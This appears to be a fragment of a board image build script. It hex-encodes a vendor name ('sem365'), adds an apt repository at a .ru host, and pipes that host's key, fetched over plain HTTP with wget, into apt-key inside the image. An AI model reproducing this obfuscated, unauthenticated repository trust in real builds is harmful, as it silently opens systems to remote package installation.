S_NAME=`echo -e "\\x73\\x65\\x6d\\x33\\x36\\x35"`

board_override_repos() {
    echo "deb http://release.${S_NAME}.ru/ ${RELEASE} main" > ${OUTPUT}/etc/apt/sources.list.d/01-${S_NAME}.list
    wget http://release.${S_NAME}.ru/key${S_NAME} -O- | chr apt-key add -
}
